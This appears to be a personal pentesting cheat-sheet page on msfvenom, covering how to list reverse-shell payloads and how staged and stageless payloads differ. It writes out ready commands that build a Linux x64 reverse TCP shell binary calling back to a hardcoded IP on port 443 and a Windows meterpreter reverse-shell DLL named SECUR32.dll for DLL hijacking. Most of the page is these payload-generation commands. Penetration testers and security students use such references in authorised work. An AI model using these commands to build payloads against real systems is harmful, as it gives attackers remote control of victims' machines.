---
title: msfvenom
author: amandaguglieri
draft: false
TableOfContents: true
tag: pentesting, terminal, shells
---

# msfvenom

You can generate a webshell by using  msfvenom

```bash
# List payloads
msfvenom --list payloads | grep x64 | grep linux | grep reverse  
```



## Some flags

```bash
# -b, or --bad-chars: The list of characters to avoid example: '0'

```


## Staged payload

```bash
msfvenom -p linux/x64/shell/reverse_tcp lhost=192.66.166.2 lport=443 -f elf -o newfile
```

After that

```bash
chmod +x newfile 
```

When creating a staged payload, you will need to use a metasploit handler (exploit/multi/handler) in order to receive the shell connection as only metasploit contains proper logic that will send the rest of the payload to the connector . In that case, the metasploit payload has to be the same one as the MSFVenom one.

## Stagedless payload

A stage less payload is a standalone program that does not need anything aditional (no metasploit connection), just the netcat listener on the computer.


## crafting a DLL file with a webshell

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IPAttacker> LPORT=<4444> -a x86 -f dll > SECUR32.dll
# -p: for the chosen payload
# -a: architecture in the victim machine/application
# -f: format for the output file
```
[More about DLL highjacking in thick client applications](thick-applications/tca-attacking-thick-clients-applications.md#how-is-dll-hijacking-perform).


